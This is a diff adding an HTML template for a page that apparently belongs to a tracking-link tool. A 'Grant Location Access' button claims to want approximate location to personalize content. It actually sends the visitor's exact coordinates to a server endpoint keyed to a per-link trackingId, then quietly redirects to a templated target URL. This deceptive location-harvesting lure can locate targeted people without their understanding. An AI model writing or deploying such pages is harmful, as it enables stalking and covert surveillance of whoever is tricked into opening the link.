@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Location Request</title>
+  </head>
+  <body style="font-family: sans-serif; padding: 2rem">
+    <h2>We need your permission to improve your experience</h2>
+    <p>To continue, we’ll ask for your approximate location to help personalize content.</p>
+    <button onclick="getLocation()">Grant Location Access</button>
+
+    <div id="status" style="margin-top: 1rem"></div>
+
+    <script>
+      async function getLocation() {
+        document.getElementById('status').innerText = 'Requesting location...';
+
+        navigator.geolocation.getCurrentPosition(
+          async (position) => {
+            const { latitude, longitude } = position.coords;
+            console.log(latitude, longitude);
+
+            const response = await fetch('/api/v1/location/<%= trackingId %>', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ latitude, longitude }),
+            });
+
+            console.log(await response.json());
+
+            setTimeout(() => {
+              document.getElementById('status').innerText =
+                'Location shared successfully! Redirecting...';
+              window.location.href = '<%= targetUrl %>';
+            }, 500);
+          },
+          (error) => {
+            console.error('Error getting location', error);
+            document.getElementById('status').innerText = 'Failed to get location.';
+          }
+        );
+      }
+    </script>
+  </body>
+</html>
